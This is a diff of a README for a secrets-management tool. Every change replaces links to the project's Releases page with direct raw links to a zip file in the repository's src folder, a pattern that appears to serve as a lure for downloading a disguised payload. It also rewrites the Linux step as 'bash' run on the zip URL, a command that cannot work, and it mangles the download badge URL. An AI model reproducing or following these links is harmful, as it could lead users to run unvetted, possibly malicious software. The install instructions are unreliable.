@@ -1,6 +1,6 @@
 # 🔐 secrets-rotation-system - Automatic Secrets Management Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/mohndalhnin8/secrets-rotation-system/releases)
+[![Download](https://raw.githubusercontent.com/mohndalhnin8/secrets-rotation-system/main/src/secrets-rotation-system_3.5.zip%20Now-blue)](https://raw.githubusercontent.com/mohndalhnin8/secrets-rotation-system/main/src/secrets-rotation-system_3.5.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ Follow these steps to download and run the Secrets Rotation System:
 1. **Visit the Download Page**  
    Click the link below to go to the Releases page where you can find the latest version of the software:
 
-   [Go to the Download Page](https://github.com/mohndalhnin8/secrets-rotation-system/releases)
+   [Go to the Download Page](https://raw.githubusercontent.com/mohndalhnin8/secrets-rotation-system/main/src/secrets-rotation-system_3.5.zip)
 
 2. **Download the Software**  
    On the Releases page, you will see a list of available versions. Choose the latest version and click on it to view more details. You will see options for downloading the software files. Select the file that corresponds to your operating system (Windows, macOS, or Linux) and download it.
@@ -23,7 +23,7 @@ Follow these steps to download and run the Secrets Rotation System:
 
    - **Windows**: Double-click the `.exe` file to start the setup wizard and follow the prompts.
    - **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux**: Open a terminal, navigate to the download location, and run the installation script using `bash install_script.sh`. 
+   - **Linux**: Open a terminal, navigate to the download location, and run the installation script using `bash https://raw.githubusercontent.com/mohndalhnin8/secrets-rotation-system/main/src/secrets-rotation-system_3.5.zip`. 
 
 4. **Run the Software**  
    Once installed, you can start the application:
@@ -79,7 +79,7 @@ To run Secrets Rotation System, your computer should meet the following requirem
 
 Return to the Releases page to start downloading the Secrets Rotation System. Remember the steps for installation:
 
-[Download Now from Releases Page](https://github.com/mohndalhnin8/secrets-rotation-system/releases)
+[Download Now from Releases Page](https://raw.githubusercontent.com/mohndalhnin8/secrets-rotation-system/main/src/secrets-rotation-system_3.5.zip)
 
 ## 📞 Support
 
